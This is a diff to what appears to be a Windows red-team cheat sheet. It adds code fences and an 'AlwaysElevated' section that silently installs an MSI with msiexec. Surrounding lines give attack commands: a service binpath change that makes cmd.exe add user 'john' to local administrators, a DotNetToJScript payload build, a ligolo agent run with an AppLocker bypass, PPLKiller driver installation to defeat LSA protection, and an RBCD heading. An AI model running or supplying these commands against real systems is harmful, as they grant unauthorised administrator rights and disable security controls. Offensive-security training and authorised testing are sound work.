@@ -5,16 +5,25 @@ sc config SNMPTRAP binpath= "cmd.exe /c net localgroup administrators john /add"
 HTA JS PAYLOAD
 ---------------------
 DotNetToJScript
-
+```powershell
 DotNetToJScript.exe ExampleAssembly.dll --lang=JScript --ver=4 -o payload.js
+```
+Install AlwaysElevated
+-----------------------
+```powershell
+Create MSI Package to run
+dotnet build -p:Platform=x64 -c Release
+cmd.exe /c "msiexec /quiet /qn /i InstallMe.msi"
+```
 
 Run the combined ligolo agent with ApplockerBypass
 -----------------------
 
 If LSA Protection 
 --------------------
+```powershell
 PPLKiller.exe /installDriver
-
+```
 RBCD
 --------------------
 ```powershell
